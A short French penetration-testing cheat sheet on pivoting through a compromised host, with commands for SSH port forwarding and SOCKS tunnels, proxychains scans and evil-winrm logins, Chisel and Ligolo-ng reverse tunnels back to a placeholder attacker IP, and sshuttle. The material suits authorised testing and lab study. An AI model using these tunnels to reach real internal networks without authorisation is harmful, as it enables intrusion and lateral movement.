# Pivoting & Tunneling

## Concepts

Le pivoting permet d'acceder a des reseaux internes via une machine compromise.

```
Attaquant --> Machine Pivot --> Reseau Interne
```

## SSH Tunneling

```bash
# Port forwarding local : acceder a un port interne via le pivot
ssh -L PORT_LOCAL:IP_INTERNE:PORT_DISTANT user@IP_PIVOT
# Exemple : acceder au port 80 de 10.10.10.5 via le pivot
ssh -L 8080:10.10.10.5:80 user@pivot

# Port forwarding distant : exposer un port local sur le pivot
ssh -R PORT_DISTANT:localhost:PORT_LOCAL user@IP_PIVOT

# Tunnel SOCKS dynamique
ssh -D 9050 user@IP_PIVOT
# Utiliser proxychains pour router le trafic
proxychains nmap -sT 10.10.10.0/24
proxychains curl http://10.10.10.5
```

## Chisel

```bash
# Sur l'attaquant (serveur)
chisel server --reverse -p 8000

# Sur le pivot (client) - SOCKS proxy
chisel client IP_ATTAQUANT:8000 R:socks

# Sur le pivot (client) - Port forward
chisel client IP_ATTAQUANT:8000 R:8080:IP_INTERNE:80
```

## Ligolo-ng

```bash
# Sur l'attaquant
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
ligolo-proxy -selfcert

# Sur le pivot
ligolo-agent -connect IP_ATTAQUANT:11601 -ignore-cert

# Dans l'interface ligolo
session                           # Selectionner la session
ifconfig                          # Voir les interfaces du pivot
# Ajouter la route vers le reseau interne
sudo ip route add 10.10.10.0/24 dev ligolo
start                             # Demarrer le tunnel
```

## Proxychains

Configuration : `/etc/proxychains4.conf`

```
# Ajouter a la fin
socks5 127.0.0.1 1080
```

```bash
proxychains nmap -sT -Pn IP_INTERNE
proxychains evil-winrm -i IP_INTERNE -u user -p pass
```

## sshuttle

```bash
# Route tout le trafic vers le reseau interne via SSH
sshuttle -r user@IP_PIVOT 10.10.10.0/24
```
